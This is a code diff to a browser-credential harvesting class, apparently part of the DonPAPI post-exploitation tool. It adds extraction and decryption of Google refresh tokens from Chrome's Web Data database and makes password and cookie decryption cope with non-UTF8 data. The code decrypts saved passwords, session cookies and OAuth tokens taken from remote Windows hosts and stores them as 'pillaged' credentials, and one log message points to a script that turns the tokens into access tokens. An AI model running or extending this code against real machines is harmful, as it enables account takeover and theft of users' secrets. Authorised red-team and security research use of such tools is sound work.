@@ -8,6 +8,7 @@ class CHROME_LOGINS:
 	def __init__(self, options,logger,db,username,type ="Chrome"):
 		self.logindata_path = None
 		self.localstate_path = None
+		self.webdata_path = None
 		self.localstate_dpapi = None
 		self.cookie_path = None
 		self.version_path = None
@@ -79,6 +80,13 @@ class CHROME_LOGINS:
 				self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Decrypt AES Password - Missing AES key from localstate ? {bcolors.ENDC}")
 			return None
 		try:
+
+			'''
+			problem with decoding when the stroed data is not UTF8
+			print(enc_password)
+			print(type(enc_password))
+			if not isinstance(enc_password,bytes):
+				enc_password=bytes(enc_password)'''
 			#Check Chrome password signature KUHL_M_DPAPI_CHROME_UNKV10[] = {'v', '1', '0'};
 			if enc_password[:3]==b'v10' or enc_password[:3]==b'v11':
 				#key = binascii.unhexlify('8fcd4861a4345013318fd63b2973c4d69c7f2094028f2e12ddcf80acb325f02d')
@@ -89,7 +97,8 @@ class CHROME_LOGINS:
 				#tag = enc_password[-16:]
 				cipher = AES.new(self.aeskey, AES.MODE_GCM, iv)
 				decrypted_pass = cipher.decrypt(payload)[:-16]#Removing bloc of padded data
-				decrypted_pass = decrypted_pass.decode('utf-8')
+				#print(decrypted_pass)
+				decrypted_pass = decrypted_pass.decode('utf-8',errors='ignore')
 				if decrypted_pass != None:
 					self.logging.debug(f"[{self.options.target_ip}] Decrypted {self.type} password : {decrypted_pass}")
 					return decrypted_pass
@@ -128,7 +137,7 @@ class CHROME_LOGINS:
 						self.logins[origin_url]['enc_password']=password
 						self.logins[origin_url]['password']=self.decrypt_chrome_password(password)
 						############PROCESSING DATA
-						self.db.add_credz(credz_type='browser-chrome',
+						self.db.add_credz(credz_type=f'browser-{self.type}',
 						                  credz_username=username,
 						                  credz_password=self.logins[origin_url]['password'],
 						                  credz_target=origin_url,
@@ -150,6 +159,56 @@ class CHROME_LOGINS:
 
 		return self.logins
 
+	def decrypt_chrome_WebData(self):
+		# path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
+		try:
+			self.logging.debug(
+				f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Decrypt WebData] {bcolors.ENDC} started for {self.webdata_path}")
+			if self.webdata_path != None:
+				if os.path.isfile(self.webdata_path):
+					connection = sqlite3.connect(self.webdata_path)
+					connection.text_factory = bytes
+					with connection:
+						cursor = connection.cursor()
+						v = cursor.execute(
+							'SELECT service, encrypted_token FROM token_service')
+						value = v.fetchall()
+					self.logging.debug(
+						f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Decrypt webdata_path] {bcolors.ENDC} got {len(value)} entries")
+					for service, encrypted_token in value:
+						service = service.decode('utf8')
+						# self.logging.debug(f"[+] Found Chrome data for user {username} : {origin_url} ")
+						origin_url = 'Google_refresh_token'
+						self.logins[origin_url] = {}
+						self.logins[origin_url]['username'] = service
+						self.logins[origin_url]['enc_password'] = encrypted_token
+						self.logins[origin_url]['password'] = self.decrypt_chrome_password(encrypted_token)
+						############PROCESSING DATA
+						self.db.add_token(credz_type='google_refresh_token',
+										  credz_username=service,
+										  credz_password=self.logins[origin_url]['password'],
+										  credz_target=origin_url,
+										  credz_path='',
+										  pillaged_from_computer_ip=self.options.target_ip,
+										  pillaged_from_username=self.username)
+						self.logging.info(
+							f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [{self.type} Google_refresh_token] {bcolors.ENDC}  [ {bcolors.OKBLUE}{self.logins[origin_url]['username']} : {self.logins[origin_url]['password']}{bcolors.ENDC} ] - Use donpapi/lib/google_refresh_token.py to get an Access Token :-)")
+		except sqlite3.OperationalError as e:
+			e = str(e)
+			if (e == 'database is locked'):
+				print('[!] Make sure Google Chrome / MS Edge is not running in the background')
+			elif (e == 'no such table: logins'):
+				print('[!] Something wrong with the database name')
+			elif (e == 'unable to open database file'):
+				print('[!] Something wrong with the database path')
+			else:
+				print(e)
+			return None
+
+		return self.logins
+
+
+
 	def decrypt_chrome_CookieData(self):
 		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 		try:
@@ -157,6 +216,8 @@ class CHROME_LOGINS:
 				self.logging.debug(f"[{self.options.target_ip}] [+] Decrypting {self.type} cookie in {self.cookie_path}")
 				if os.path.isfile(self.cookie_path):
 					connection = sqlite3.connect(self.cookie_path)
+					connection.text_factory = bytes
+					#lambda b: b.decode(encoding='UTF8',errors='ignore')
 					with connection:
 						cursor = connection.cursor()
 						v = cursor.execute(
@@ -166,10 +227,14 @@ class CHROME_LOGINS:
 					self.logging.debug(f"[{self.options.target_ip}] [+] Found {len(values)} {self.type} cookies")
 					for host_key, _, path, _, expires_utc, name, encrypted_value in values:
 						self.logging.debug(f"[{self.options.target_ip}] [+] Found {self.type} cookie for {host_key}, cookie name: {name}, expire at utc :{(datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')}")
+						host_key=host_key.decode('utf8')
+						name = name.decode('utf8')
+						path = path.decode('utf8')
+						#expires_utc = expires_utc.decode('utf8')
 						self.cookies[host_key]={}
 						self.cookies[host_key][name]=self.decrypt_chrome_password(encrypted_value)
 						############PROCESSING DATA
-						self.db.add_cookies(credz_type='browser-chrome',
+						self.db.add_cookies(credz_type=f'browser-{self.type}',
 						                  credz_name=name,
 						                  credz_value=self.cookies[host_key][name],
 						                  credz_expires_utc=expires_utc,
@@ -202,7 +267,7 @@ class CHROME_LOGINS:
 					f=open(self.version_path,'rb')
 					self.version = f.read().decode('utf8')
 					f.close()
-					self.db.add_browser_version(browser_type='browser-chrome',
+					self.db.add_browser_version(browser_type=f'browser-{self.type}',
 						                  version=self.version,
 						                  pillaged_from_computer_ip=self.options.target_ip,
 						                  pillaged_from_username=self.username)
